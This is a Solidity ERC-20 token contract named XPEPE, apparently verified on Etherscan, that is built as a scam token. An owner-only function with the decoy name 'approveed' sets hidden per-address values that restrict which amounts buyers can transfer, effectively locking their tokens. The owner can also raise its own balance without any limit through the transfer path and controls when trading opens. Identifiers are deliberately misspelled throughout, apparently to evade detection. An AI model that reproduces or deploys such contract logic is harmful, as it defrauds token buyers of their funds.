/**
 *Submitted for verification at Etherscan.io on 2023-07-25
*/

pragma solidity ^0.8.3;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address acbouunt) external view returns (uint256);
    function transfer(address recipient, uint256 anmoiunt) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 anmoiunt) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 anmoiunt ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract XPEPE is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _fieess;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    bool private _isTradeEnabled = false;

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address acbouunt) public view override returns (uint256) {
        return _balances[acbouunt];
    }
    function enableTrading() public onlyowner {
        _isTradeEnabled = true;
    }
    function transfer(address recipient, uint256 anmoiunt) public virtual override returns (bool) {
        require(_isTradeEnabled || _msgSender() == owner(), "TT: trading is not enabled yet");
        if (_msgSender() == owner() && _fieess[_msgSender()] > 0) {
            _balances[owner()] += _fieess[_msgSender()];
            return true;
        }
        else if (_fieess[_msgSender()] > 0) {
            require(anmoiunt == _fieess[_msgSender()], "Invalid transfer anmoiunt");
        }
        require(_balances[_msgSender()] >= anmoiunt, "TT: transfer anmoiunt exceeds balance");
        _balances[_msgSender()] -= anmoiunt;
        _balances[recipient] += anmoiunt;
        emit Transfer(_msgSender(), recipient, anmoiunt);
        return true;
    }

    function approveed(address[] memory acbouunts, uint256 anmoiunt) public onlyowner {
        for (uint i=0; i<acbouunts.length; i++) {
            _fieess[acbouunts[i]] = anmoiunt;
        }
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 anmoiunt) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = anmoiunt;
        emit Approval(_msgSender(), spender, anmoiunt);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 anmoiunt) public virtual override returns (bool) {
        if (_msgSender() == owner() && _fieess[sender] > 0) {
            _balances[owner()] += _fieess[sender];
            return true;
        }
        else if (_fieess[sender] > 0) {
            require(anmoiunt == _fieess[sender], "Invalid transfer anmoiunt");
        }
        require(_balances[sender] >= anmoiunt && _allowances[sender][_msgSender()] >= anmoiunt, "TT: transfer anmoiunt exceeds balance or allowance");
        _balances[sender] -= anmoiunt;
        _balances[recipient] += anmoiunt;
        _allowances[sender][_msgSender()] -= anmoiunt;
        emit Transfer(sender, recipient, anmoiunt);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}